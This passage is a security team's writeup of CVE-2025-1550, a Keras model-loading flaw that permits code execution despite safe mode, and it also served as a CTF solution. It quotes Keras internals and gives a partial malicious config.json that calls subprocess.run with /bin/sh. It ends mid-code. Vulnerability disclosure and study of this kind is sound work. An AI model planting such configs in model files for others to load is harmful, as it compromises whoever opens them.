<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon-dark.svg" media="(prefers-color-scheme: light)"><link rel="icon" type="image/svg+xml" href="/favicon.svg" media="(prefers-color-scheme: dark)"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://towerofhanoi.it/writeups/cve-2025-1550/"><!-- Primary Meta Tags --><title>CVE-2025-1550 - Arbitrary Code Execution on Keras</title><meta name="title" content="CVE-2025-1550 - Arbitrary Code Execution on Keras"><meta name="description" content="This writeup is about the CVE-2025-1550 vulnerability, which was the intended solution to the `Unintended Behaviour` challenge I authored for the ToH CTF 2025."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://towerofhanoi.it/writeups/cve-2025-1550/"><meta property="og:title" content="CVE-2025-1550 - Arbitrary Code Execution on Keras"><meta property="og:description" content="This writeup is about the CVE-2025-1550 vulnerability, which was the intended solution to the `Unintended Behaviour` challenge I authored for the ToH CTF 2025."><meta property="og:image" content="/writeup_images/keras-toh-ctf25.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://towerofhanoi.it/writeups/cve-2025-1550/"><meta property="twitter:title" content="CVE-2025-1550 - Arbitrary Code Execution on Keras"><meta property="twitter:description" content="This writeup is about the CVE-2025-1550 vulnerability, which was the intended solution to the `Unintended Behaviour` challenge I authored for the ToH CTF 2025."><meta property="twitter:image" content="/writeup_images/keras-toh-ctf25.png"><style>:root{--accent: #fea819;--accent-dark: #ac7010;--accent-dark-010: #ac70100a}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.25}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1em 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:0 .3em;background-color:#1f1f1f;border-radius:.2em;font-size:.8em}pre{padding:1em;border-radius:.2em}pre>code{all:unset;font-size:.8em}blockquote{border-left:4px solid var(--accent);padding:.01em 0 .01em 1em;margin:0;background-color:var(--accent-dark-010)}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}table{border-collapse:collapse;text-align:center}tr{border:1px solid #e9e9e9}th,td{padding:.5em;text-align:center}th{background-color:#1f1f1f;color:#fff}td{background-color:#1b1b1b}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
@media (prefers-color-scheme: dark){.markdown-alert{--color-border-default: #30363d;--color-accent-fg: #58a6ff;--color-accent-emphasis: #1f6feb;--color-danger-fg: #f85149;--color-danger-emphasis: #da3633;--color-attention-fg: #d29922;--color-attention-emphasis: #9e6a03;--color-done-fg: #a371f7;--color-done-emphasis: #8957e5;--color-success-fg: #3fb950;--color-success-emphasis: #238636}}@media (prefers-color-scheme: light){.markdown-alert{--color-border-default: #d0d7de;--color-accent-fg: #0969da;--color-accent-emphasis: #0969da;--color-danger-fg: #d1242f;--color-danger-emphasis: #cf222e;--color-attention-fg: #9a6700;--color-attention-emphasis: #9a6700;--color-done-fg: #8250df;--color-done-emphasis: #8250df;--color-success-fg: #1a7f37;--color-success-emphasis: #1f883d}}.markdown-alert{border-left:.25em solid var(--borderColor-default, var(--color-border-default));color:inherit;margin-bottom:16px;padding:.5rem 1em}.markdown-alert>:last-child{margin-bottom:0!important}.markdown-alert .markdown-alert-title{align-items:center;display:flex;font-size:14px;font-weight:500;line-height:1}.markdown-alert .markdown-alert-title svg.octicon{margin-right:8px!important;margin-right:var(--base-size-8,8px)!important;fill:currentColor}.markdown-alert.markdown-alert-note{border-left-color:var(--borderColor-accent-emphasis,var(--color-accent-emphasis))}.markdown-alert.markdown-alert-note .markdown-alert-title{color:var(--color-accent-fg);color:var(--fgColor-accent,var(--color-accent-fg))}.markdown-alert.markdown-alert-tip{border-left-color:var(--borderColor-success-emphasis,var(--color-success-emphasis))}.markdown-alert.markdown-alert-tip .markdown-alert-title{color:var(--color-success-fg);color:var(--fgColor-success,var(--color-success-fg))}.markdown-alert.markdown-alert-important{border-left-color:var(--borderColor-done-emphasis,var(--color-done-emphasis))}.markdown-alert.markdown-alert-important .markdown-alert-title{color:var(--color-done-fg);color:var(--fgColor-done,var(--color-done-fg))}.markdown-alert.markdown-alert-warning{border-left-color:var(--borderColor-attention-emphasis,var(--color-attention-emphasis))}.markdown-alert.markdown-alert-warning .markdown-alert-title{color:var(--color-attention-fg);color:var(--fgColor-attention,var(--color-attention-fg))}.markdown-alert.markdown-alert-caution{border-left-color:var(--borderColor-danger-emphasis,var(--color-danger-emphasis))}.markdown-alert.markdown-alert-caution .markdown-alert-title{color:var(--color-danger-fg);color:var(--fgColor-danger,var(--color-danger-fg))}main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/keras-toh-ctf25.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2025-07-20T16:00:01.000Z"> Jul 20, 2025 </time>  </div> <h1 data-astro-cid-dxom2xcl>CVE-2025-1550 - Arbitrary Code Execution on Keras</h1> <h3 data-astro-cid-dxom2xcl> by Gabriele Digregorio (Io_no)</h3> <hr data-astro-cid-dxom2xcl> </div>  <p>This writeup is about the CVE-2025-1550 vulnerability, which I discovered at the end of 2024 and was later awarded a bounty by the Google Open Source Vulnerability Rewards Program (OSS VRP).</p>
<p>Exploiting this vulnerability was also the intended solution to the <code>Unintended Behaviour</code> challenge I authored for the <a href="https://ctftime.org/event/2833">ToH CTF 2025</a>.</p>
<blockquote>
<p><strong>TL;DR</strong></p>
<p>The Keras <code>Model.load_model</code> function permits arbitrary code execution, even with <code>safe_mode=True</code>, through a manually constructed, malicious <code>.keras</code> archive. By altering the <code>config.json</code> file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.
The vulnerability has been fixed in Keras 3.9.0.</p>
</blockquote>
<h2 id="details">Details</h2>
<p>The vulnerability affects the Keras model format <code>.keras</code>, which is used to store and load Keras models. The vulnerability allows an attacker to create a malicious <code>.keras</code> model that, when loaded, executes arbitrary code on the victim’s machine. In the simplest case, a victim can be compromised simply by executing <code>keras.saving.load_model("model.keras")</code> with a malicious model. The attack works regardless of the parameter passed to <code>load_model</code>.</p>
<p>In particular, <code>keras.saving.load_model</code> includes a parameter <code>safe_mode</code>, which is set to <code>True</code> by default. The official Keras documentation describes <code>safe_mode</code> as:</p>
<div style="border-left: 4px solid #4A9782; background-color: #1e1e1e; padding: 1em;">
    <strong>safe_mode</strong>: Boolean, whether to disallow unsafe lambda deserialization. When <code>safe_mode=False</code>, loading an object has the potential to trigger arbitrary code execution. This argument is only applicable to the Keras v3 model format. Defaults to <code>True</code>.
</div>
<p>Additionally, as stated in the <a href="https://keras.io/guides/serialization_and_saving/">Keras serialization and saving documentation</a>:</p>
<div style="border-left: 4px solid #4A9782; background-color: #1e1e1e; padding: 1em;">
    The saved <code>.keras</code> file is lightweight and does not store the Python code for custom objects. Therefore, to reload the model, <code>load_model</code> requires access to the definition of any custom objects used through one of the following methods:
  <ol>
    <li>Registering custom objects (preferred),</li>
    <li>Passing custom objects directly when loading, or</li>
    <li>Using a custom object scope</li>
  </ol>
</div>
<p>Unlike other attacks, the exploit reported here does not depend on <code>Lambda</code> layers in any way. Furthermore, it does not rely on any custom object definitions, meaning it requires no custom definitions from the victim or any additional assumptions. An attacker can create a custom model that, when parsed by Keras internals, leads to arbitrary code execution at <strong>parsing time</strong> (i.e., there is no need to call the model, just to load it). This is due to incorrect validation of allowed modules and some missing checks in parts of the loading code.</p>
<h2 id="exploit">Exploit</h2>
<p>The <code>.keras</code> model format is essentially a ZIP archive containing three files: <code>config.json</code>, <code>metadata.json</code>, and <code>model.weights.h5</code>.</p>
<p>The <a href="https://keras.io/guides/serialization_and_saving/">Keras documentation</a> describes these files as follows:</p>
<div style="border-left: 4px solid #4A9782; background-color: #1e1e1e; padding: 1em;">
    <ul> 
        <li> A JSON-based configuration file (config.json): Records the configuration of the model, layers, and other trackables.</li>
        <li> A H5-based state file, such as model.weights.h5 (for the whole model), with directory keys for layers and their weights.</li>
        <li> A metadata file in JSON, storing information such as the current Keras version.</li>
    </ul>
</div>
<p>The exploit requires manually crafting a custom <code>config.json</code> and understanding some implementation details of the Keras library. This can be achieved by (quickly) reverse-engineering the Keras source code.</p>
<p>The exploit proposed below targets Keras versions 3.7 and 3.8. Note that this shows just one possible setup—other equivalent solutions with different execution flows may yield similar results. Additionally, different Keras versions may use slightly different naming conventions or follow different internal branches, which could require adjusting the exploit accordingly.</p>
<p>Most of the exploit can be summarized in the following part of the <code>config.json</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#B8A96577">    "</span><span style="color:#B8A965">module</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">subprocess</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A96577">    "</span><span style="color:#B8A965">class_name</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">run</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic">    ...</span></span>
<span class="line"><span style="color:#B8A96577">    "</span><span style="color:#B8A965">inbound_nodes</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#666666">        {</span></span>
<span class="line"><span style="color:#B8A96577">            "</span><span style="color:#B8A965">args</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#666666">            ],</span></span>
<span class="line"><span style="color:#B8A96577">            "</span><span style="color:#B8A965">kwargs</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#666666"> {}</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    ]</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<h5 id="bypassing-safe-loading">Bypassing Safe Loading</h5>
<p>If we look at the Keras source code, we see that <code>load_model</code> internally calls the <code>deserialize_keras_object</code> function, located at <code>keras/lib/python3.12/site-packages/keras/src/saving/serialization_lib.py</code>. By following its execution flow, we can observe how it parses the <code>config.json</code> structure and branches based on fields like <code>module</code>, <code>class_name</code>, and other JSON elements. Indeed, Keras is designed to only allow deserialization of objects registered with the <code>@keras.saving.register_keras_serializable()</code> decorator. There are also special behaviors for certain class names, such as <code>__tensor__</code> and <code>__numpy__</code>. The <code>__lambda__</code> class is treated differently—it is only allowed when <code>safe_mode=False</code>, as it poses evident security risks.</p>
<p>The most interesting part comes later. If none of the previous cases match the values in <code>config.json</code>, then the following code is executed:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">module </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> config</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">module</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> None</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">registered_name </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> config</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">registered_name</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> class_name</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#C99076">...</span></span>
<span class="line"><span style="color:#C99076">cls</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> _retrieve_class_or_fn</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#DBD7CAEE">    class_name</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    registered_name</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    module</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">    obj_type</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">class</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">    full_config</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">config</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">    custom_objects</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">custom_objects</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p><code>_retrieve_class_or_fn</code> is implemented as follows:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> _retrieve_class_or_fn</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#DBD7CAEE">    name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> registered_name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> module</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> obj_type</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> full_config</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> custom_objects</span><span style="color:#CB7676">=</span><span style="color:#4D9375">None</span></span>
<span class="line"><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">    ...</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> module</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> module </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">keras</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> module</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">keras.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">            ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> obj_type </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">function</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> module </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">builtins</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">            ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">        # Otherwise, attempt to retrieve the class object given the `module`</span></span>
<span class="line"><span style="color:#758575DD">        # and `class_name`. Import the module, find the class.</span></span>
<span class="line"><span style="color:#4D9375">        try</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            mod </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> importlib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">import_module</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">module</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        except</span><span style="color:#B8A965"> ModuleNotFoundError</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">            ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">        obj </span><span style="color:#666666">=</span><span style="color:#B8A965"> vars</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">mod</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">get</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#4D9375"> None</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">        ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> obj </span><span style="color:#CB7676">is</span><span style="color:#CB7676"> not</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            return</span><span style="color:#DBD7CAEE"> obj</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">    ...</span></span>
<span class="line"></span></code></pre>
<p>I’ve only included the most relevant code branches for clarity. As you can see, the code uses <code>importlib</code> to import the specified module and then uses <code>.get</code> to access the class specified by <code>class_name</code>. The way it extracts the class imposes some constraints on what we can import and use, but what we can do is sufficient for an exploit.</p>
<p>Returning to <code>deserialize_keras_object</code>, after the above code, it expects the retrieved class to be somewhat expected. In particular:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">if</span><span style="color:#B8A965"> isinstance</span><span style="color:#666666">(</span><span style="color:#C99076">cls</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> types</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">FunctionType</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#C99076"> cls</span></span>
<span class="line"><span style="color:#4D9375">if</span><span style="color:#CB7676"> not</span><span style="color:#B8A965"> hasattr</span><span style="color:#666666">(</span><span style="color:#C99076">cls</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">from_config</span><span style="color:#C98A7D77">"</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    raise</span><span style="color:#B8A965"> TypeError</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">Unable to reconstruct an instance of '</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> class_name </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">' because </span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">the class is missing a `from_config()` method. </span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">Full object config: </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> config</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"></span></code></pre>
<p>If the class does not have the method <code>from_config</code>, Keras will raise an exception. However, if the class is a <code>FunctionType</code>, it simply returns it. <code>FunctionType</code> is different from <code>BuiltinsFunctionType</code>, making it a bit harder to find the correct function to use. However, <code>subprocess.run</code> is perfect for this purpose, fitting the entire code flow.</p>
<h5 id="passing-arbitrary-arguments">Passing arbitrary arguments</h5>
<p>Now the problem arises when we need to pass the correct arguments. In Keras, a model is seen as a graph where the output of one node is the input of the following node. We can abuse this mechanism. In the <code>config.json</code>, it is defined how a node should take inputs from other nodes, using <code>inbound_nodes</code>. Let us reverse-engineer how the code is implemented.</p>
<p>We focus on the <code>deserialize_node</code> function in <code>keras/src/models/functional.py</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> deserialize_node</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">node_data</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> created_layers</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> node_data</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666"> [],</span><span style="color:#666666"> {}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#B8A965"> isinstance</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">node_data</span><span style="color:#666666">,</span><span style="color:#B8A965"> list</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">        ...</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">unpack_singleton</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input_tensors</span><span style="color:#666666">)],</span><span style="color:#DBD7CAEE"> kwargs</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    args </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> serialization_lib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">deserialize_keras_object</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">node_data</span><span style="color:#666666">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">args</span><span style="color:#C98A7D77">"</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">    kwargs </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> serialization_lib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">deserialize_keras_object</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">node_data</span><span style="color:#666666">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">kwargs</span><span style="color:#C98A7D77">"</span><span style="color:#666666">])</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> convert_revived_tensor</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">        ...</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> x</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    args </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tree</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">map_structure</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">convert_revived_tensor</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">)</span></span>
